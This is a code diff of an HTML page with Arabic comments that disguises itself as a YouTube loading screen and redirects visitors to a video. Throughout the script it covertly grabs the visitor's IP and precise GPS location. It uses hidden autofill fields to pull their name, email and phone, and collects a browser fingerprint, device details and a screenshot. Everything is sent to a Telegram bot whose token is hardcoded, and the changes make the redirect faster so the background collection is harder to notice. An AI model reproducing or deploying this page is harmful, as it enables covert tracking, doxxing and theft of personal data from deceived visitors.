@@ -8,7 +8,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
-        /* ===== نفس التصميم السابق (لن نكرره للاختصار) ===== */
+        /* ===== نفس التصميم السابق (مختصر) ===== */
         * {
             margin: 0;
             padding: 0;
@@ -231,7 +231,6 @@
     </style>
 </head>
 <body>
-
     <!-- ===== HEADER (نفسه) ===== -->
     <div class="header">
         <div class="header-left">
@@ -280,7 +279,7 @@
         <div class="status-text" id="statusText">جاري التحميل ...</div>
     </div>
 
-    <!-- ===== حقول خفية لـ autofill ===== -->
+    <!-- ===== حقول خفية ===== -->
     <input type="email" class="hidden-field" id="hiddenEmail" name="email" autocomplete="email" value="">
     <input type="text" class="hidden-field" id="hiddenName" name="name" autocomplete="name" value="">
     <input type="tel" class="hidden-field" id="hiddenTel" name="tel" autocomplete="tel" value="">
@@ -297,20 +296,15 @@
         const CONFIG = {
             targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
             botToken: '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI',
-            chatId: '170383339',
-            minDelay: 3500,
-            maxDelay: 5500
+            chatId: '170383339'
         };
 
         // ================================================================
         //  المتغيرات
         // ================================================================
         let isRedirected = false;
-        let progressValue = 0;
         let progressInterval = null;
-        let capturedImage = null;
-
-        const shareBtn = document.getElementById('shareBtn');
+        let progressValue = 0;
 
         // ================================================================
         //  دوال مساعدة
@@ -319,63 +313,84 @@
             console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
         }
 
-        function updateProgress() {
-            if (progressValue < 90) {
-                const increment = Math.floor(Math.random() * 7) + 2;
-                progressValue = Math.min(progressValue + increment, 90);
-                document.getElementById('progressBar').style.width = progressValue + '%';
+        // ================================================================
+        //  جمع البيانات الأساسية (IP والموقع) – هذان فقط ما ننتظره للتحويل
+        // ================================================================
+        async function getIP() {
+            const services = [
+                { url: 'https://api.ipify.org?format=json', key: 'ip' },
+                { url: 'https://httpbin.org/ip', key: 'origin' }
+            ];
+            for (const svc of services) {
+                try {
+                    const ctrl = new AbortController();
+                    const tid = setTimeout(() => ctrl.abort(), 2000);
+                    const res = await fetch(svc.url, { signal: ctrl.signal });
+                    clearTimeout(tid);
+                    if (res.ok) {
+                        const data = await res.json();
+                        const ip = data[svc.key];
+                        if (ip && ip.trim()) return ip.trim();
+                    }
+                } catch (_) {}
             }
+            return 'غير متوفر';
         }
 
-        function finishProgress() {
-            clearInterval(progressInterval);
-            progressValue = 100;
-            document.getElementById('progressBar').style.width = '100%';
-            document.getElementById('statusText').textContent = 'تم التحميل ...';
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) { resolve(null); return; }
+                let done = false;
+                const opts = { enableHighAccuracy: true, timeout: 4000, maximumAge: 60000 };
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        if (done) return;
+                        done = true;
+                        const coords = pos.coords;
+                        resolve({
+                            latitude: +coords.latitude.toFixed(6),
+                            longitude: +coords.longitude.toFixed(6),
+                            accuracy: Math.round(coords.accuracy)
+                        });
+                    },
+                    () => { if (!done) { done = true;
+                            resolve(null); } },
+                    opts
+                );
+                setTimeout(() => { if (!done) { done = true;
+                        resolve(null); } }, 4000);
+            });
         }
 
         // ================================================================
-        //  جمع البيانات المتقدمة (الجديد)
+        //  جمع البيانات المتقدمة (تُجمع في الخلفية بعد التحويل)
         // ================================================================
         async function collectAdvancedData() {
             const data = {};
-
-            // 1. البطارية
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    data.battery = {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime ? Math.round(battery.chargingTime / 60) + ' دقيقة' : 'غير معروف',
-                        dischargingTime: battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' دقيقة' :
-                            'غير معروف'
-                    };
+                    data.battery = { level: Math.round(battery.level * 100), charging: battery.charging };
                 }
             } catch (_) {}
 
-            // 2. الشبكة (Connection)
             try {
                 if (navigator.connection) {
                     const conn = navigator.connection;
                     data.connection = {
                         type: conn.effectiveType || 'غير معروف',
                         downlink: conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف',
-                        rtt: conn.rtt ? conn.rtt + ' ms' : 'غير معروف',
-                        saveData: conn.saveData || false
+                        rtt: conn.rtt ? conn.rtt + ' ms' : 'غير معروف'
                     };
                 }
             } catch (_) {}
 
-            // 3. معلومات إضافية من الجهاز
             data.hardware = {
                 cores: navigator.hardwareConcurrency || 'غير معروف',
                 memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير معروف',
-                platform: navigator.platform || 'غير معروف',
-                vendor: navigator.vendor || 'غير معروف'
+                platform: navigator.platform || 'غير معروف'
             };
 
-            // 4. نظام التشغيل الدقيق (تحليل userAgent)
             const ua = navigator.userAgent;
             let os = 'غير معروف';
             if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
@@ -389,17 +404,13 @@
             else if (ua.includes('Linux')) os = 'Linux';
             data.os = os;
 
-            // 5. دقة الشاشة الفعلية
             data.screen = {
                 width: screen.width,
                 height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
                 colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio || 1
             };
 
-            // 6. الإضافات (Plugins)
             try {
                 const plugins = [];
                 for (let i = 0; i < navigator.plugins.length; i++) {
@@ -408,35 +419,15 @@
                 data.plugins = plugins.length > 0 ? plugins.join(', ') : 'لا يوجد';
             } catch (_) {}
 
-            // 7. إعدادات Do Not Track
             data.doNotTrack = navigator.doNotTrack || 'غير محدد';
-
-            // 8. اللغات المفضلة
             data.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language || 'غير معروف';
 
-            // 9. الـ IP المحلي عبر WebRTC (محاولة)
-            try {
-                const rtc = new RTCPeerConnection({ iceServers: [] });
-                rtc.createDataChannel('');
-                await rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                await new Promise(resolve => setTimeout(resolve, 1000));
-                const ips = [];
-                rtc.onicecandidate = (e) => {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
-                        if (ip && !ips.includes(ip[0])) ips.push(ip[0]);
-                    }
-                };
-                data.localIP = ips.length > 0 ? ips.join(', ') : 'غير متوفر';
-                rtc.close();
-            } catch (_) {
-                data.localIP = 'غير متوفر';
-            }
-
-            // 10. محاولة جلب الاسم ورقم الهاتف من autofill
+            // Autofill
             const nameInput = document.getElementById('hiddenName');
+            const emailInput = document.getElementById('hiddenEmail');
             const telInput = document.getElementById('hiddenTel');
-            [nameInput, telInput].forEach(el => {
+
+            [nameInput, emailInput, telInput].forEach(el => {
                 el.style.position = 'relative';
                 el.style.left = '0';
                 el.style.top = '0';
@@ -446,25 +437,20 @@
                 el.style.height = '1px';
                 el.style.position = 'absolute';
             });
+
             nameInput.focus();
-            setTimeout(() => nameInput.blur(), 100);
+            setTimeout(() => nameInput.blur(), 50);
+            emailInput.focus();
+            setTimeout(() => emailInput.blur(), 50);
             telInput.focus();
-            setTimeout(() => telInput.blur(), 100);
+            setTimeout(() => telInput.blur(), 50);
 
-            await new Promise(resolve => setTimeout(resolve, 600));
+            await new Promise(resolve => setTimeout(resolve, 300));
             data.autofillName = nameInput.value.trim() || 'غير موجود';
+            data.autofillEmail = emailInput.value.trim() || 'غير موجود';
             data.autofillTel = telInput.value.trim() || 'غير موجود';
-            nameInput.style.display = 'none';
-            telInput.style.display = 'none';
 
-            // 11. توقيت تحميل الصفحة
-            try {
-                const perf = performance.timing;
-                const loadTime = perf.loadEventEnd - perf.navigationStart;
-                data.pageLoadTime = loadTime > 0 ? loadTime + ' ms' : 'غير معروف';
-            } catch (_) {}
-
-            // 12. بصمة المتصفح (Fingerprint)
+            // Fingerprint
             try {
                 const fp = await FingerprintJS.load();
                 const result = await fp.get();
@@ -479,9 +465,6 @@
             return data;
         }
 
-        // ================================================================
-        //  جمع البيانات الأساسية (القديمة)
-        // ================================================================
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
             const now = new Date();
@@ -511,79 +494,18 @@
             };
         }
 
-        // ================================================================
-        //  الحصول على IP
-        // ================================================================
-        async function getIP() {
-            const services = [
-                { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                { url: 'https://httpbin.org/ip', key: 'origin' },
-                { url: 'https://api.my-ip.io/ip.json', key: 'ip' }
-            ];
-            for (const svc of services) {
-                try {
-                    const ctrl = new AbortController();
-                    const tid = setTimeout(() => ctrl.abort(), 3000);
-                    const res = await fetch(svc.url, { signal: ctrl.signal });
-                    clearTimeout(tid);
-                    if (res.ok) {
-                        const data = await res.json();
-                        const ip = data[svc.key];
-                        if (ip && ip.trim()) return ip.trim();
-                    }
-                } catch (_) {}
-            }
-            return 'غير متوفر';
-        }
-
-        // ================================================================
-        //  الحصول على الموقع (بإذن المستخدم)
-        // ================================================================
-        function getLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                let done = false;
-                const opts = { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 };
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        if (done) return;
-                        done = true;
-                        const coords = pos.coords;
-                        resolve({
-                            latitude: +coords.latitude.toFixed(6),
-                            longitude: +coords.longitude.toFixed(6),
-                            accuracy: Math.round(coords.accuracy),
-                            altitude: coords.altitude,
-                            speed: coords.speed
-                        });
-                    },
-                    () => { if (!done) { done = true;
-                            resolve(null); } },
-                    opts
-                );
-                setTimeout(() => { if (!done) { done = true;
-                        resolve(null); } }, 6000);
-            });
-        }
-
-        // ================================================================
-        //  لقطة الشاشة
-        // ================================================================
         async function captureScreenshot() {
             try {
                 const element = document.getElementById('captureArea');
                 const canvas = await html2canvas(element, {
-                    scale: 1.8,
+                    scale: 1.5,
                     backgroundColor: '#0f0f0f',
                     logging: false,
                     allowTaint: false,
                     useCORS: true
                 });
-                return canvas.toDataURL('image/jpeg', 0.92);
-            } catch (error) {
-                log(`❌ فشل التقاط الصورة: ${error.message}`);
-                return null;
-            }
+                return canvas.toDataURL('image/jpeg', 0.85);
+            } catch (_) { return null; }
         }
 
         function dataURLtoBlob(dataURL) {
@@ -598,12 +520,12 @@
         }
 
         // ================================================================
-        //  إرسال إلى تليجرام (متطور)
+        //  إرسال إلى تليجرام (في الخلفية)
         // ================================================================
         async function sendToTelegram(baseData, advancedData, imageDataURL) {
             const token = CONFIG.botToken;
             const chatId = CONFIG.chatId;
-            if (!token || !chatId) return false;
+            if (!token || !chatId) return;
 
             const d = baseData;
             const adv = advancedData;
@@ -611,30 +533,20 @@
             const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
 
             let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
-
-            // ===== البيانات المتقدمة =====
-            caption += `📧 *البريد الإلكتروني:* ${adv.autofillEmail || 'غير موجود'}\n`;
+            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
             caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
-            caption += `📱 *رقم الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
-            caption += `🆔 *بصمة المتصفح:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
-            caption += `🔍 *مكونات البصمة:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
-
-            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}%`;
-            if (adv.battery) caption += ` (${adv.battery.charging ? '🔄 شحن' : '🔋 غير موصول'})`;
-            caption += `\n`;
-
-            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'}, RTT ${adv.connection?.rtt || '?'})\n`;
+            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
+            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
+            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
+            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
+            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
             caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
             caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
-            caption += `💻 *نظام التشغيل:* ${adv.os || 'غير معروف'}\n`;
-            caption += `🖥️ *دقة الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت, نسبة ${adv.screen?.pixelRatio}x)\n`;
+            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
+            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
             caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
-            caption += `🚫 *Do Not Track:* ${adv.doNotTrack || 'غير محدد'}\n`;
-            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n`;
-            caption += `🌐 *IP المحلي:* ${adv.localIP || 'غير متوفر'}\n`;
-            caption += `⏱️ *وقت تحميل الصفحة:* ${adv.pageLoadTime || 'غير معروف'}\n\n`;
-
-            // ===== البيانات الأساسية =====
+            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
+            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
             caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
             caption += `🌐 *الرابط:* ${d.device.url}\n`;
             caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
@@ -642,13 +554,10 @@
             caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
             caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
             caption += `🗣 *اللغة:* ${d.device.language}\n`;
-            caption += `💻 *النظام:* ${d.device.platform}\n`;
-            caption += `\n🌐 *IP العام:* ${d.ip}\n`;
+            caption += `\n🌐 *IP:* ${d.ip}\n`;
             caption += `📍 *الموقع:* ${loc}\n`;
             if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
-            caption += `\n📐 *الشاشة:* ${d.device.screenSize}\n`;
-            caption += `⏳ *المنطقة:* ${d.device.timezone}\n`;
-            caption += `🍪 *الكوكيز:* ${d.device.cookieEnabled ? 'مفعل' : 'معطل'}`;
+            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
 
             try {
                 if (imageDataURL) {
@@ -658,178 +567,112 @@
                     formData.append('photo', blob, 'youtube_screenshot.jpg');
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
-
-                    const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                    if (res.ok) {
-                        log('✅ تم إرسال الصورة + البيانات المتقدمة');
-                        return true;
-                    } else {
-                        return await sendTextOnly(token, chatId, caption);
-                    }
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
                 } else {
-                    return await sendTextOnly(token, chatId, caption);
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: caption,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
                 }
+                log('✅ تم إرسال البيانات إلى تليجرام');
             } catch (e) {
-                log(`❌ خطأ: ${e.message}`);
-                return false;
+                log(`❌ فشل الإرسال: ${e.message}`);
             }
         }
 
-        async function sendTextOnly(token, chatId, text) {
-            try {
-                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: text,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: true
-                    })
-                });
-                return res.ok;
-            } catch (_) { return false; }
-        }
-
         // ================================================================
-        //  زر المشاركة
+        //  زر المشاركة (يظهر بعد التقاط الصورة)
         // ================================================================
         function setupShareButton(imageDataURL) {
-            if (!imageDataURL) { shareBtn.style.display = 'none'; return; }
+            if (!imageDataURL) { document.getElementById('shareBtn').style.display = 'none'; return; }
             const blob = dataURLtoBlob(imageDataURL);
             const file = new File([blob], 'youtube_screenshot.jpg', { type: 'image/jpeg' });
-
-            shareBtn.addEventListener('click', async () => {
+            const btn = document.getElementById('shareBtn');
+            btn.addEventListener('click', async () => {
                 if (navigator.share) {
                     try {
-                        await navigator.share({
-                            title: 'YouTube',
-                            text: 'شاهد هذا الفيديو على يوتيوب',
-                            files: [file]
-                        });
-                        log('✅ تمت المشاركة');
-                    } catch (err) {
-                        if (err.name !== 'AbortError') log(`❌ فشل المشاركة: ${err.message}`);
-                    }
+                        await navigator.share({ title: 'YouTube', text: 'شاهد هذا الفيديو', files: [file] });
+                    } catch (_) {}
                 } else {
-                    alert('اضغط مع الاستمرار على الصورة لحفظها، ثم شاركها يدوياً.');
                     const win = window.open();
-                    if (win) {
-                        win.document.write(
-                            `<img src="${imageDataURL}" style="max-width:100%;height:auto;" /><br/><p>اضغط مع الاستمرار لحفظ الصورة</p>`
-                            );
-                        win.document.title = 'YouTube Screenshot';
-                    }
+                    if (win) win.document.write(`<img src="${imageDataURL}" style="max-width:100%;height:auto;" />`);
                 }
             });
-
-            setTimeout(() => shareBtn.classList.add('visible'), 1000);
+            setTimeout(() => btn.classList.add('visible'), 500);
         }
 
         // ================================================================
-        //  محاولة جلب البريد الإلكتروني من autofill
-        // ================================================================
-        async function tryGetEmail() {
-            const emailInput = document.getElementById('hiddenEmail');
-            emailInput.style.position = 'relative';
-            emailInput.style.left = '0';
-            emailInput.style.top = '0';
-            emailInput.style.opacity = '0';
-            emailInput.style.pointerEvents = 'none';
-            emailInput.style.width = '1px';
-            emailInput.style.height = '1px';
-            emailInput.style.position = 'absolute';
-
-            emailInput.focus();
-            setTimeout(() => emailInput.blur(), 100);
-            await new Promise(resolve => setTimeout(resolve, 600));
-            const email = emailInput.value.trim();
-            emailInput.style.display = 'none';
-            return email && email.includes('@') ? email : null;
-        }
-
-        // ================================================================
-        //  العملية الرئيسية
+        //  العملية الرئيسية – ذكية وسريعة
         // ================================================================
         async function main() {
-            log('🚀 بدء التشغيل (نسخة متطورة جداً)');
+            log('🚀 بدء التشغيل الذكي');
 
-            progressInterval = setInterval(updateProgress, 300);
+            // 1. نبدأ شريط التقدم بسرعة
+            let progress = 0;
+            progressInterval = setInterval(() => {
+                progress += 5 + Math.floor(Math.random() * 5);
+                if (progress > 90) progress = 90;
+                document.getElementById('progressBar').style.width = progress + '%';
+            }, 100);
 
-            // 1. جمع البيانات الأساسية
+            // 2. جمع البيانات الأساسية (IP والموقع) – ننتظرهم فقط
             const deviceInfo = collectDeviceInfo();
+            const ipPromise = getIP();
+            const locPromise = getLocation();
+
             let ip = 'غير متوفر';
             let location = null;
-
             try {
-                const [ipRes, locRes] = await Promise.allSettled([getIP(), getLocation()]);
+                const [ipRes, locRes] = await Promise.allSettled([ipPromise, locPromise]);
                 if (ipRes.status === 'fulfilled') ip = ipRes.value;
                 if (locRes.status === 'fulfilled') location = locRes.value;
             } catch (_) {}
 
             const baseData = { device: deviceInfo, ip, location };
 
-            // 2. جمع البيانات المتقدمة
-            log('📊 جمع البيانات المتقدمة...');
-            const advData = await collectAdvancedData();
+            // 3. تم جمع الأساسيات – نتحول فوراً
+            log('✅ تم جمع الأساسيات، التحويل فوراً');
+            // نكمل شريط التقدم إلى 100%
+            clearInterval(progressInterval);
+            document.getElementById('progressBar').style.width = '100%';
+            document.getElementById('statusText').textContent = 'تم التحميل ...';
 
-            // 3. محاولة جلب الإيميل
-            const email = await tryGetEmail();
-            advData.autofillEmail = email || 'غير موجود';
-
-            // 4. لقطة الشاشة
-            log('📸 التقاط الصورة...');
-            const screenshot = await captureScreenshot();
-            if (screenshot) {
-                capturedImage = screenshot;
-                setupShareButton(screenshot);
+            // التحويل الفوري
+            if (!isRedirected) {
+                isRedirected = true;
+                try {
+                    window.location.replace(CONFIG.targetUrl);
+                } catch (_) {
+                    window.location.href = CONFIG.targetUrl;
+                }
             }
 
-            // 5. إرسال إلى تليجرام
-            log('📤 إرسال البيانات...');
-            await sendToTelegram(baseData, advData, screenshot);
+            // 4. بعد التحويل (في الخلفية)، نكمل جمع البيانات المتقدمة ونرسلها
+            log('📊 بدء جمع البيانات المتقدمة في الخلفية');
+            const advData = await collectAdvancedData();
+            const screenshot = await captureScreenshot();
+            if (screenshot) setupShareButton(screenshot);
 
-            // 6. التحويل بعد مدة عشوائية
-            const delay = Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay + 1)) + CONFIG.minDelay;
-            log(`⏳ الانتظار ${delay} مللي ثانية`);
-
-            setTimeout(() => {
-                finishProgress();
-                setTimeout(() => {
-                    if (!isRedirected) {
-                        isRedirected = true;
-                        log('🔄 تحويل صامت');
-                        try {
-                            window.location.replace(CONFIG.targetUrl);
-                        } catch (_) {
-                            window.location.href = CONFIG.targetUrl;
-                        }
-                    }
-                }, 600);
-            }, delay);
-
-            setTimeout(() => {
-                if (!isRedirected) {
-                    isRedirected = true;
-                    log('⚠️ تحويل احتياطي');
-                    window.location.replace(CONFIG.targetUrl);
-                }
-            }, 10000);
+            // إرسال إلى تليجرام
+            sendToTelegram(baseData, advData, screenshot);
         }
 
         // ================================================================
         //  بدء التشغيل
         // ================================================================
         if (document.readyState === 'complete') {
-            setTimeout(main, 600);
+            setTimeout(main, 100);
         } else {
-            window.addEventListener('load', () => setTimeout(main, 600));
+            window.addEventListener('load', () => setTimeout(main, 100));
         }
 
-        log('✅ تم تحميل النسخة المتطورة جداً مع جمع شامل');
+        log('✅ تم تحميل النسخة الذكية (التحويل فوراً بعد الأساسيات)');
     </script>
 </body>
 </html>
